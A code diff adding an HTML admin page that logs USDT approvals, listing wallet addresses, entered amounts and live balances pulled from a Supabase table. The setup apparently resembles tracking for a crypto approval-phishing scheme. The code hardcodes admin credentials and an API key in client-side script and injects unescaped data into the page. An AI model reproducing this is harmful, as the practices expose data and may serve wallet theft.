@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Panel - USDT Approvals</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      padding: 20px;
+      color: #333;
+    }
+    h1 {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 40px;
+    }
+    th, td {
+      padding: 12px;
+      border: 1px solid #ccc;
+      text-align: left;
+      font-size: 14px;
+    }
+    th {
+      background-color: #26C8F2;
+      color: white;
+    }
+    tr:nth-child(even) {
+      background-color: #f2f2f2;
+    }
+    .unauthorized {
+      color: red;
+      text-align: center;
+      margin-top: 100px;
+    }
+  </style>
+</head>
+<body>
+  <h1>USDT Approval Logs</h1>
+  <div id="table-container"></div>
+
+  <script>
+    const ADMIN_USERNAME = "admin"; // repo secret: ADMIN_USERNAME
+    const ADMIN_PASSWORD = "supersecure"; // repo secret: ADMIN_PASSWORD
+
+    const SUPABASE_URL = "https://ycmspiedqvwzzrgpxeci.supabase.co";
+    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljbXNwaWVkcXZ3enpyZ3B4ZWNpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM1OTMxODQsImV4cCI6MjA2OTE2OTE4NH0.z0sw1x0ysYlBdIg4zGM8Y6J59KTVw3Ta9j-xaxCbT5o";
+
+    const promptLogin = async () => {
+      const user = prompt("Enter admin username:");
+      const pass = prompt("Enter admin password:");
+      if (user === ADMIN_USERNAME && pass === ADMIN_PASSWORD) {
+        loadData();
+      } else {
+        document.body.innerHTML = '<p class="unauthorized">❌ Unauthorized Access</p>';
+      }
+    };
+
+    const loadData = async () => {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/approvals?select=*`, {
+        headers: {
+          "apikey": SUPABASE_KEY,
+          "Authorization": `Bearer ${SUPABASE_KEY}`
+        }
+      });
+
+      const data = await res.json();
+      data.sort((a, b) => new Date(b.timestampz) - new Date(a.timestampz));
+
+      let html = `<table>
+        <thead>
+          <tr>
+            <th>Wallet Address</th>
+            <th>Entered Amount</th>
+            <th>Live Balance</th>
+            <th>Timestamp</th>
+          </tr>
+        </thead>
+        <tbody>`;
+
+      for (const row of data) {
+        html += `
+          <tr>
+            <td>${row.wallet_address}</td>
+            <td>${row.amount}</td>
+            <td>${row.balance}</td>
+            <td>${new Date(row.timestampz).toLocaleString()}</td>
+          </tr>`;
+      }
+
+      html += `</tbody></table>`;
+      document.getElementById("table-container").innerHTML = html;
+    };
+
+    promptLogin();
+  </script>
+</body>
+</html>
